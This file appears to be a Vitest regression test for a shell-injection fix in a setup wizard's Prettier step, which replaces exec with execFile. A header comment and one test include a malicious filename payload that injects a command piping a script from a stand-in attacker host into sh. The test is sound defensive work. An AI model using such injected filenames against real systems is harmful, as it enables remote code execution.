/**
 * Regression test for the F2 shell-injection fix in run-prettier.
 *
 * Before this fix, run-prettier built a shell command string by joining
 * `git status` filenames with spaces and interpolating into:
 *   exec(`npx prettier --ignore-unknown --write ${files}`)
 *
 * A repository containing a tracked file with shell metacharacters in its
 * name (e.g. `; curl evil.sh | sh #`) would execute that command as soon as
 * the user ran the wizard. Now we use execFile with an argv array, so shell
 * metacharacters are inert.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as ChildProcess from 'node:child_process';
import { Integration } from '../../lib/constants';

vi.mock('node:child_process', async () => {
  const actual = await vi.importActual<typeof import('node:child_process')>(
    'node:child_process',
  );
  return { __esModule: true, ...actual };
});

vi.mock('../../utils/setup-utils', () => ({
  isInGitRepo: vi.fn().mockReturnValue(true),
  getUncommittedOrUntrackedFiles: vi.fn(),
  tryGetPackageJson: vi
    .fn()
    .mockResolvedValue({ devDependencies: { prettier: '^3.0.0' } }),
}));

vi.mock('../../utils/package-json', () => ({
  hasPackageInstalled: vi.fn().mockReturnValue(true),
}));

vi.mock('../../utils/analytics', () => ({
  analytics: { wizardCapture: vi.fn() },
}));

vi.mock('../../ui', () => ({
  getUI: vi.fn().mockReturnValue({
    log: { info: vi.fn(), error: vi.fn(), warn: vi.fn() },
    spinner: vi.fn().mockReturnValue({
      start: vi.fn(),
      stop: vi.fn(),
      message: vi.fn(),
    }),
  }),
}));

vi.mock('../../telemetry', () => ({
  traceStep: vi.fn(async (_name: string, fn: () => Promise<unknown>) => fn()),
}));

import { runPrettierStep } from '../run-prettier';
import * as setupUtils from '../../utils/setup-utils';

describe('runPrettierStep — shell-injection regression', () => {
  beforeEach(() => {
    vi.clearAllMocks();
    vi.mocked(setupUtils.isInGitRepo).mockReturnValue(true);
  });

  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('uses execFile (no shell) and passes filenames as separate argv entries', async () => {
    vi.mocked(setupUtils.getUncommittedOrUntrackedFiles).mockReturnValue([
      '- src/foo.ts',
      '- src/bar.tsx',
    ]);

    const execFileSpy = vi
      .spyOn(ChildProcess, 'execFile')
      // @ts-expect-error - don't care about the return value
      .mockImplementationOnce((file, args, cb) => {
        if (typeof cb === 'function') {
          cb(null, '', '');
        }
      });

    // exec must NOT be called (that would mean a shell-string regression)
    const execSpy = vi.spyOn(ChildProcess, 'exec');

    await runPrettierStep({
      installDir: process.cwd(),
      integration: Integration.javascript_web,
    });

    expect(execSpy).not.toHaveBeenCalled();
    expect(execFileSpy).toHaveBeenCalledTimes(1);
    const callArgs = execFileSpy.mock.calls[0];
    expect(callArgs[0]).toBe('npx');
    expect(callArgs[1]).toEqual([
      'prettier',
      '--ignore-unknown',
      '--write',
      '--',
      'src/foo.ts',
      'src/bar.tsx',
    ]);
  });

  it('does not allow shell metacharacters in filenames to escape into argv', async () => {
    // Simulate a malicious filename returned by `git status`. Even though
    // git would normally quote such a name, the wizard previously joined
    // raw values with spaces and passed to `exec` (a shell). With execFile
    // each filename is its own argv entry — the shell never sees it.
    const evil = '; curl http://evil.example/x.sh | sh #';
    vi.mocked(setupUtils.getUncommittedOrUntrackedFiles).mockReturnValue([
      `- ${evil}`,
    ]);

    const execFileSpy = vi
      .spyOn(ChildProcess, 'execFile')
      // @ts-expect-error - don't care about the return value
      .mockImplementationOnce((file, args, cb) => {
        if (typeof cb === 'function') {
          cb(null, '', '');
        }
      });

    await runPrettierStep({
      installDir: process.cwd(),
      integration: Integration.javascript_web,
    });

    const callArgs = execFileSpy.mock.calls[0];
    // The dangerous string is preserved verbatim as ONE argv entry. Prettier
    // will most likely error on it (file does not exist), but no shell ever
    // expands `;`, `|`, or `#`.
    expect(callArgs[1]).toContain(evil);
    // And the dangerous tokens remain a single string — they are not split
    // across multiple argv entries.
    expect(callArgs[1]?.filter((a: string) => a === ';')).toHaveLength(0);
    expect(callArgs[1]?.filter((a: string) => a === '|')).toHaveLength(0);
  });
});
